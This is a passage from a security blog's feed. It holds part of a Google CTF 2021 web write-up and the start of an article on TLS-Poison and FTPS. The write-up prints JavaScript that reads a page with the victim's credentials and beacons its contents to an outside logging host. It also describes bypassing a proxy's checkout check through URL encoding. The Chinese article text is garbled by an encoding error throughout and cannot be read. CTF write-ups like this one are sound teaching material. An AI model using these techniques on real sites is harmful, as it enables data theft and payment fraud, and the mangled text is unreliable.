class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">    lis, err: = net.Listen(<span class="hljs-string">"tcp"</span>, <span class="hljs-string">":https"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        log.Fatalf(<span class="hljs-string">"Failed to listen: %v"</span>, err)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    count: = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> {</span><br><span class="line">        conn, err: = lis.Accept()</span><br><span class="line">        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">            log.Fatalf(<span class="hljs-string">"Failed to accept: %v"</span>, err)</span><br><span class="line">        }</span><br><span class="line">        count++</span><br><span class="line">        <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span> {</span><br><span class="line">            <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {</span><br><span class="line">                err: = servePage(conn)</span><br><span class="line">                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">                    log.Printf(<span class="hljs-string">"Failed to serve page: %v"</span>, err)</span><br><span class="line">                }</span><br><span class="line">            }()</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {</span><br><span class="line">                err: = serveProxy(conn)</span><br><span class="line">                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">                    log.Printf(<span class="hljs-string">"Failed to serve proxy: %v"</span>, err)</span><br><span class="line">                }</span><br><span class="line">            }()</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>The javascript code is something like this.</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  navigator.sendBeacon(<span class="hljs-string">'https://http_log'</span>, <span class="hljs-keyword">this</span>.responseText)</span><br><span class="line">};</span><br><span class="line">xhttp.open(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/"</span>, <span class="hljs-literal">true</span>);</span><br><span class="line">xhttp.withCredentials = <span class="hljs-literal">true</span>;</span><br><span class="line">xhttp.send();</span><br></pre></td></tr></tbody></table></figure><p></p><p>At last, we got the flag. Pretty cool, man!</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/static/google-ctf-2021-web1.png" alt=""></p><h2 id="GPU-Shop"><a href="#GPU-Shop" class="headerlink" title="GPU Shop"></a>GPU Shop</h2><p>This challenge has an environment that is so complex that I donâ€™t know how to explain it. I want to try my best to describe the setting of the challenge in short.</p><p>The challenge provides two services. </p><ol><li>The first service is a reverse proxy service <a href="https://paymeflare-web.2021.ctfcompetition.com" target="_blank" rel="noopener">https://paymeflare-web.2021.ctfcompetition.com</a>. After you log in to this site with your Google account, you could set some settings according to the <a href="https://paymeflare-web.2021.ctfcompetition.com/doc" target="_blank" rel="noopener">document</a>.<ul><li>The reverse proxy will set an HTTP header x-pay and visit your IP. </li><li>If you want to visit the URL which has â€˜checkoutâ€™, the proxy will add an HTTP header â€˜X-Walletâ€™. </li></ul></li><li>There is another service <a href="http://gpushop.2021.ctfcompetition.com" target="_blank" rel="noopener">http://gpushop.2021.ctfcompetition.com</a>. This website uses the paymeflare service as the reverse proxy. You could buy the flag on this website.</li></ol><ul><li><ul><li>When you try to buy the flag, it will get the eth address from the HTTP header â€˜X-Walletâ€™. </li><li>Request the balance of the eth address through cloudflare-eth.com.</li><li>If your balance is greater than your cost, you will get the flag.</li></ul></li></ul><p><del>We donâ€™t know how to solve the challenge, so we ask our boss to get a pretty rich eth address and buy the flag in the end.</del></p><p>Although there are many proxies in the challenge, we could use URLEncode to bypass the â€˜checkoutâ€™ limitation, and the backend will not get the â€˜X-Walletâ€™ header. The GPU shop will get a pretty rich eth address because of the code used in gpushop.</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format_addr</span><span class="hljs-params">($addr)</span> </span>{</span><br><span class="line">true<span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span>.str_pad($addr, <span class="hljs-number">40</span>, <span class="hljs-string">'0'</span>, STR_PAD_LEFT);</span><br><span class="line">}</span><br><span class="line">$order-&gt;wallet = <span class="hljs-keyword">$this</span>-&gt;format_addr($request-&gt;header(<span class="hljs-string">'X-Wallet'</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>When the header â€˜X-Walletâ€™ is not set, the value of <code>$order-&gt;wallet</code> is <code>0x0000000000000000000000000000000000000000</code> and the balance of this address is <code>0x1c923afe206b9068f3f</code> which is greater than the cost of flag <code>1537550000000000000000</code>. So we could buy the flag.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.niupic.com/images/2021/07/21/9otK.png" alt=""></p><h2 id="Other-Webs"><a href="#Other-Webs" class="headerlink" title="Other Webs"></a>Other Webs</h2><p>There are other two webs. One of them is callled letschat. In this challenge, you need to do a lot of brainstorming, and we take pretty much time to solve this challenge but still fail in the end. Although the intended solution is to predict the UUID of the message, I realized that some teams bruted the UUID to get the flag. Mmm, this really makes me mad. Itâ€™s too guessy and pretty annoying. I initially thought this challenge was inspired by some slackâ€™s vulnerabilities from the real world, but the intended solution beat me.</p><p>The last web is an XSS challenge created by @terjanq. Pretty cool and amazing. You could read this <a href="https://gist.github.com/terjanq/458d8ec1148e96f7ccbdccfd908c56f6" target="_blank" rel="noopener">simple solution</a> written by him.</p><p>Thanks for reading. Hope my bad English has not affected your reading of this article. :&gt;</p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2021/05/19/tls-ctf/</id>
        <title><![CDATA[TLS-Poison æ”»å‡»æ–¹å¼åœ¨ CTF ä¸­çš„åˆ©ç”¨å®è·µ]]></title>
        <updated>2021-08-12T09:17:22+08:00</updated>
        <link href="https://blog.zeddyu.info/2021/05/19/tls-ctf/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2021/05/19/tls-ctf/"><![CDATA[<html><head></head><body><p>æœ€è¿‘æ€»ç»“æ•´ç†äº† TLS Poison æ”»å‡»ç›¸å…³çš„çŸ¥è¯†ï¼Œæœ¬æ–‡ä¼šç»§ç»­è®² TLS Poison åˆ©ç”¨ï¼Œä»¥åŠå…¶åœ¨ CTF çš„å®é™…è¿ç”¨ï¼Œä¹Ÿé€šè¿‡è¿™ä¸ªé¢˜ç›®æ¥èŠèŠ FTPS ç›¸å…³çŸ¥è¯†ã€‚</p><blockquote class="colorquote success"><p>æ–‡ç« é¦–å‘äºé•¿äº­å®‰å…¨è¯¾å ‚ï¼šTLS-Poison æ”»å‡»æ–¹å¼åœ¨çœŸå®CTFèµ›é¢˜ä¸­çš„åˆ©ç”¨å®è·µ <a href="https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ</a></p></blockquote><a id="more"></a><p><strong>PS: åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰ï¼Œå»ºè®®æ‚¨æŒæ¡ç›¸å…³çš„ TLS Poison å…ˆéªŒçŸ¥è¯†ï¼Œæœ¬æ–‡ä¸ä¼šå†é‡æ–°è¯¦ç»†ä»‹ç» TLS Poison æ”»å‡»çš„åŸºç¡€çŸ¥è¯†</strong></p><p>æˆ‘ä»¬é¦–å…ˆå†æ¥å›é¡¾ Black Hat è¿™ä¸ªè®®é¢˜ï¼Œä¸ºä»€ä¹ˆä½œè€…ä½¿ç”¨çš„æ˜¯ When TLS Hacks You å‘¢ï¼Ÿè€Œä¸æ˜¯ When HTTPS Hack You ï¼Œè¯´æ˜è¿™ä¸ªé—®é¢˜æ˜¯å‡ºç°åœ¨ TLS ç‰¹æ€§èº«ä¸Šï¼Œæ‰€ä»¥ç›®å‰æˆ‘ä»¬è²Œä¼¼éƒ½æ›´å¤šåªå±€é™åœ°ä¸“æ³¨åœ¨ HTTPS ä¸Šï¼Œè¿™æ˜¯æ¯”è¾ƒç‹­éš˜çš„è€ƒè™‘ã€‚æ—¢ç„¶å¦‚æ­¤ï¼ŒHTTPS æ˜¯ HTTP over TLS ï¼Œé‚£å…¶ä»–åè®®æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å‘¢ï¼Ÿæ¯”å¦‚ FTPS ï¼ŒFTP over TLS ç­‰ç­‰ï¼Ÿé‚£æˆ‘ä»¬æ¥çœ‹çœ‹ FTPS å¯ä»¥å¦‚ä½•ä½¿ç”¨ã€‚</p><h2 id="Introduction-of-FTPS"><a href="#Introduction-of-FTPS" class="headerlink" title="Introduction of FTPS"></a>Introduction of FTPS</h2><blockquote><p>â€‹    <strong>FTPS</strong> (also known <strong>FTP-SSL</strong>, and <em>FTP Secure</em>) is an extension to the commonly used <a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol" target="_blank" rel="noopener">File Transfer Protocol</a> (FTP) that adds support for the <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security" target="_blank" rel="noopener">Transport Layer Security</a> (TLS) and, formerly, the <a href="https://en.wikipedia.org/wiki/Secure_Sockets_Layer" target="_blank" rel="noopener">Secure Sockets Layer</a> (SSL, which is now prohibited by <a href="https://tools.ietf.org/html/rfc7568" target="_blank" rel="noopener">RFC7568</a>) cryptographic protocols.</p><p>FTPS should not be confused with the <a href="https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol" target="_blank" rel="noopener">SSH File Transfer Protocol</a> (SFTP), a secure file transfer subsystem for the <a href="https://en.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener">Secure Shell</a> (SSH) protocol with which it is not compatible. It is also different from <a href="https://en.wikipedia.org/wiki/FTP_over_SSH" target="_blank" rel="noopener">FTP over SSH</a>, which is the practice of tunneling FTP through an SSH connection.</p></blockquote><p>é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹ FTPS ï¼ŒFTPS æ˜¯ä¸€ç§å¯¹å¸¸ç”¨çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆFTPï¼‰æ·»åŠ ä¼ è¾“å±‚å®‰å…¨ï¼ˆTLSï¼‰å’Œå®‰å…¨å¥—æ¥å±‚ï¼ˆSSLï¼‰åŠ å¯†åè®®æ”¯æŒçš„æ‰©å±•åè®®ã€‚</p><p>åœ¨ HTTPS æ¨ªç©ºå‡ºä¸–ä¹‹åï¼ŒSSL åè®®ä¹Ÿåº”ç”¨åˆ°äº† FTP ä¸Šï¼Œéšååœ¨ 1996 å‘å¸ƒäº† FTPS çš„ä¸€ä¸ªè‰æ¡ˆ <a href="https://tools.ietf.org/id/draft-murray-auth-ftp-ssl-00.txt" target="_blank" rel="noopener">Secure FTP over SSL</a> ï¼Œä½†æ˜¯ç›´åˆ° 2005 å¹´æ‰æœ€ç»ˆç¡®å®šç»ˆç¨¿ <a href="https://tools.ietf.org/html/rfc4217" target="_blank" rel="noopener">RFC 4217 - Securing FTP with TLS</a> ã€‚ç„¶è€Œå®é™…ä¸Šï¼ŒFTPS æ‹¥æœ‰ä¸¤ç§æ¨¡å¼ï¼Œè¿™é‡Œå¹¶éæŒ‡çš„æ˜¯ FTP çš„ä¸»åŠ¨ã€è¢«åŠ¨æ¨¡å¼ï¼Œè€Œæ˜¯æ˜¾å¼ã€éšå¼æ¨¡å¼ã€‚</p><h3 id="Implicit-Mode"><a href="#Implicit-Mode" class="headerlink" title="Implicit Mode"></a>Implicit Mode</h3><p>åœ¨éšå¼æ¨¡å¼ä¸‹ï¼ŒFTPS çš„é»˜è®¤ç«¯å£åœ¨ 990 ç«¯å£ä¸Šï¼Œéšå¼æ¨¡å¼ä¸‹æ‰€æœ‰çš„è¿æ¥æ•°æ®å‡ä¸ºåŠ å¯†ã€‚</p><p>å®¢æˆ·ç«¯å¿…é¡»å…ˆä½¿ç”¨ TLS Client Hello æ¶ˆæ¯å‘ FTPS æœåŠ¡å™¨è¿›è¡Œæ¡æ‰‹æ¥åˆ›å»ºåŠ å¯†è¿æ¥ï¼Œå¦‚æœ FTPS æœåŠ¡å™¨æœªæ”¶åˆ°æ­¤ç±»æ¶ˆæ¯ï¼Œåˆ™æœåŠ¡å™¨åº”æ–­å¼€è¿æ¥ã€‚ ä¸ºäº†ä¿æŒä¸ç°æœ‰çš„é FTPS æ„ŸçŸ¥å®¢æˆ·ç«¯çš„å…¼å®¹æ€§ï¼Œéšå¼ FTPS é»˜è®¤åœ¨ IANA è§„å®šçš„ç«¯å£ 990/TCP ä¸Šç›‘å¬ FTPS æ§åˆ¶é€šé“ï¼Œå¹¶åœ¨ç«¯å£ 989/TCP ä¸Šç›‘å¬ FTPS æ•°æ®é€šé“ã€‚è¿™ä½¿å¾—ç®¡ç†å‘˜å¯ä»¥ä¿ç•™ç«¯å£(æ§åˆ¶é€šé“ 21/TCP ä¸æ•°æ®é€šé“ 20/TCP )ä»¥å…¼å®¹åŸå§‹çš„FTPã€‚</p><p>è™½ç„¶æˆ‘æ²¡æœ‰æŸ¥æ‰¾åˆ°éšå¼ FTPS çš„ç›¸å…³å†å²ï¼Œä½†æ˜¯æˆ‘ä¸ªäººè§‰å¾—ä»–æ›´åƒåœ¨ SSL æ—¶ä»£åº”è¿è€Œç”Ÿçš„äº§ç‰©ï¼Œæ›´ç¬¦åˆäº† FTP over SSL çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯ä¸€å¼€å§‹ä½¿ç”¨ TLS/SSL è¿›è¡Œä¼šè¯åˆ›å»ºï¼Œå†è¿›è¡Œæ•°æ®åŠ å¯†ä¼ è¾“ã€‚ä½† RFC 4217 ä¸­æœªå®šä¹‰éšå¼æ¨¡å¼ï¼Œå› æ­¤å®ƒä¹Ÿè¢«è®¤ä¸ºæ˜¯FTPåå•†TLS/SSLä¸­è¿‡æ—¶çš„æ—©æœŸæ–¹æ³•ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.sftpplus.de/static/images/4608-ImplicitFTPS.png" alt=""></p><h3 id="Explicit-Mode"><a href="#Explicit-Mode" class="headerlink" title="Explicit Mode"></a>Explicit Mode</h3><p>åœ¨æ˜¾å¼æ¨¡å¼ï¼ˆä¹Ÿç§°ä¸ºFTPESï¼‰ä¸‹ï¼ŒFTPS å®¢æˆ·ç«¯å…ˆä¸æœåŠ¡å™¨åˆ›å»ºæ˜æ–‡è¿æ¥ï¼Œç„¶åä»æ§åˆ¶é€šé“æ˜ç¡®è¯·æ±‚æœåŠ¡ç«¯å‡çº§ä¸ºåŠ å¯†è¿æ¥ï¼ˆå‘½ä»¤ä¸º: AUTH TLSï¼‰ã€‚æ§åˆ¶é€šé“ä¸æ•°æ®é€šé“é»˜è®¤ç«¯å£ä¸åŸå§‹ FTP ä¸€æ ·ä¹Ÿæ˜¯ 21 ç«¯å£ã€‚æ§åˆ¶é€šé“å§‹ç»ˆåŠ å¯†ï¼Œè€Œæ•°æ®é€šé“æ˜¯å¦åŠ å¯†åˆ™ä¸ºå¯é€‰é¡¹ã€‚ åŒæ—¶è‹¥æœåŠ¡å™¨æœªé™åˆ¶æ˜æ–‡è¿æ¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æœªåŠ å¯†çš„åŸå§‹ FTP è¿›è¡Œè¿æ¥ï¼Œä¹Ÿå°±æ˜¯è¯´æœåŠ¡å™¨åœ¨ç›¸åŒçš„ç«¯å£ä¸ŠåŒæ—¶æä¾› FTP ä¸ FTPS æœåŠ¡ã€‚</p><p>ä¸FTPåå•†è®¤è¯å’Œå®‰å…¨çš„æœºåˆ¶æ˜¯åœ¨ RFC 2228 ä¸‹å¢åŠ çš„ï¼Œå…¶ä¸­åŒ…æ‹¬æ–°çš„ FTP å‘½ä»¤ AUTH ã€‚è™½ç„¶è¯¥ RFC æ²¡æœ‰æ˜ç¡®å®šä¹‰ä»»ä½•æ‰€éœ€çš„å®‰å…¨æœºåˆ¶ï¼Œå¦‚ SSL æˆ– TLS ï¼Œä½†å®ƒç¡®å®è¦æ±‚ FTPS å®¢æˆ·ç«¯ç”¨ä¸€ä¸ªåŒæ–¹éƒ½çŸ¥é“çš„æœºåˆ¶æŒ‘æˆ˜ FTPS æœåŠ¡å™¨ã€‚å¦‚æœ FTPS å®¢æˆ·ç«¯ç”¨ä¸€ä¸ªæœªçŸ¥çš„å®‰å…¨æœºåˆ¶æŒ‘æˆ˜ FTPS æœåŠ¡å™¨ï¼Œ FTPS æœåŠ¡å™¨å°†ä»¥é”™è¯¯ä»£ç  504ï¼ˆä¸æ”¯æŒï¼‰å“åº” AUTH å‘½ä»¤ã€‚å®¢æˆ·å¯ä»¥é€šè¿‡ä½¿ç”¨ FEAT å‘½ä»¤æŸ¥è¯¢ FTPS 